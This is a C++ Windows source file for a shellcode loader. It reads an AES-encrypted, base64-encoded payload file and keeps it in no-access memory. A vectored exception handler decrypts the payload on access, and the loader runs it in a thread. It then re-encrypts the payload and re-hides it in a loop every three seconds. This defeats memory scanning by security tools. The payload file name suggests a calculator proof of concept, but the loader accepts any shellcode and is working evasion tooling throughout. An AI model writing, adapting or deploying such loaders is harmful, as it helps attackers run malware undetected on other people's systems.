#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

using namespace std;

void* exec_mem;
SIZE_T current_len = 0;          
vector<char> shellcode;
DWORD old;

const char AES_KEY[16] = { 0xdb, 0x6f, 0x8, 0x7d, 0x79, 0xac, 0x21, 0x1f, 0x0, 0x3, 0x54, 0xeb, 0xd8, 0xc0, 0x9e, 0x71 };

void aes_decrypt(unsigned char* data, SIZE_T len) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)AES_KEY, sizeof(AES_KEY), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    DWORD dwLen = (DWORD)len;
    CryptDecrypt(hKey, NULL, TRUE, 0, data, &dwLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void base64_decode(unsigned char* data, SIZE_T* len) {
    DWORD decodedSize = 0;
    CryptStringToBinaryA((LPCSTR)data, (DWORD)*len, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    CryptStringToBinaryA((LPCSTR)data, (DWORD)*len, CRYPT_STRING_BASE64, data, &decodedSize, NULL, NULL);
    *len = decodedSize;
}

void aes_encrypt(unsigned char* data, SIZE_T* len) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)AES_KEY, sizeof(AES_KEY), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

    DWORD plainLen = (DWORD)*len;
    DWORD bufferLen = plainLen + 16;
    BYTE* buffer = (BYTE*)malloc(bufferLen);

    memcpy(buffer, data, plainLen);
    DWORD encryptedLen = plainLen;
    if (CryptEncrypt(hKey, NULL, TRUE, 0, buffer, &encryptedLen, bufferLen)) {
        memcpy(data, buffer, encryptedLen);
        *len = encryptedLen;
    }
    free(buffer);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void base64_encode(unsigned char* data, SIZE_T* len) {
    DWORD encodedSize = 0;
    CryptBinaryToStringA(data, (DWORD)*len, CRYPT_STRING_BASE64, NULL, &encodedSize);
    if (encodedSize == 0) return;
    BYTE* encoded = (BYTE*)malloc(encodedSize);
    if (!encoded) return;
    if (CryptBinaryToStringA(data, (DWORD)*len, CRYPT_STRING_BASE64, (LPSTR)encoded, &encodedSize)) {
        memcpy(data, encoded, encodedSize);
        *len = encodedSize;
    }
    free(encoded);
}

LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == 0xc0000005) {
        void* faultAddr = (void*)ExceptionInfo->ExceptionRecord->ExceptionInformation[1];
        if (faultAddr >= exec_mem && faultAddr < (BYTE*)exec_mem + current_len) {
            
            printf("\n[!] Access violation at %p\n", faultAddr);
            // Decrypt & decode
            VirtualProtect(exec_mem, current_len, PAGE_READWRITE, &old);

            printf("[*] Decrypting & decoding shellcode...\n");
            aes_decrypt((unsigned char*)exec_mem, current_len);
            base64_decode((unsigned char*)exec_mem, &current_len);

            VirtualProtect(exec_mem, current_len, PAGE_EXECUTE_READ, &old);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    // Load original encrypted+base64 file
    ifstream infile;
    infile.open(R"(..\..\aes_b64_calc.bin)", ios::in | ios::binary);
    if (!infile.is_open()) { printf("Failed to open file.\n"); return 1; }
    infile.seekg(0, ios::end);
    SIZE_T fileSize = infile.tellg();
    infile.seekg(0, ios::beg);
    shellcode.resize(fileSize);
    infile.read(shellcode.data(), fileSize);
    infile.close();

    SIZE_T allocationSize = fileSize * 2 + 256;
    // Allocate buffer (double size for expansion)
    exec_mem = VirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated %zu bytes at %p\n", allocationSize, exec_mem);

    RtlMoveMemory(exec_mem, shellcode.data(), fileSize);
    current_len = fileSize;
    printf("[+] Loaded %zu encrypted bytes\n", current_len);

    printf("[+] VEH registered successfully\n");
    AddVectoredExceptionHandler(1, handler);
    VirtualProtect(exec_mem, current_len, PAGE_NOACCESS, &old);

    int iter = 0;
    while (true) {
        iter++;

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (!hThread) break;
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        printf("[+] Executing shellcode...\n");

        VirtualProtect(exec_mem, current_len, PAGE_READWRITE, &old);
        // Re-encryot shellcode
        printf("[*] Encoding & encrypting shellcode...\n", iter);
        base64_encode((unsigned char*)exec_mem, &current_len);
        aes_encrypt((unsigned char*)exec_mem, &current_len);

        // Reprotect shellcode with PAGE_NOACCESS
        printf("[*] Changing protection to PAGE_NOACCESS!\n");
        VirtualProtect(exec_mem, current_len, PAGE_NOACCESS, &old);
        Sleep(3000);
    }

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}